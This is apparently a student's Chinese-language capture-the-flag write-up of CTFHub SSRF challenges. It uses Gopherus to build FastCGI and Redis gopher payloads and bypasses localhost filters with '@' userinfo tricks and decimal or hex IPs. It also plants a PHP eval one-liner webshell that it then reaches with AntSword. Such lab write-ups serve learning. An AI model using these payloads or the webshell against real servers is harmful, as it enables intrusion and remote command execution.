# 寒假WEEK4

## [ssrf/fastcgi协议]

打开之后发现什么都没有，但观察url，发现有一个get参数url

使用gopherus工具：

```
cd Gopherus

./gopherus.py --exploit fastcgi
```

![image-20250216192857560](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216192857560.png)

第一行写根目录，第二行要执行的命令

![image-20250216192920677](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216192920677.png)

![image-20250216192928455](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216192928455.png)

将生成的payload进行二次url编码，bp上传之后即可得到flag



查询资料的时候，发现该题还有用上传一句话木马来连接webshell的方法，于是尝试了一下将执行的命令替换成：

```
echo "<?php eval(\$_POST[cmd]);?>" >1.php
```

将一句话木马写入1.php文件中

![image-20250216193031247](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216193031247.png)

二次url编码后上传payload，蚁剑连接，即可在根目录找到flag



## [ssrf/redis]

![image-20250216193117546](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216193117546.png)

用gopherus生成payload，如图所示，url二次编码后蚁剑连接，即可在根目录得到flag



## [ssrf] URL Bypass

提示：

请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧

打开以后有提示：url must startwith "http://notfound.ctfhub.com"

所以payload：

?url=http://notfound.ctfhub.com@127.0.0.1/flag.php

------

在URL中，@用于分隔认证信息（用户名和密码）和主机名。

例如：

https://example.com@test.com

其中@符号前的内容会被认定为用户名和密码，符号后的是解析地址，所以该url实际访问的是test.com，和example.com就无关了

------



## [ssrf] 数字IP Bypass

提示：

这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

因为将127ban了，所以可以将127.0.0.1转化为十进制或者十六进制

![image-20250216193419533](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250216193419533.png)

故payload：

?url=http://0X7F000001/flag.php

?url=http://2130706433/flag.php

?url=http://localhost/flag.php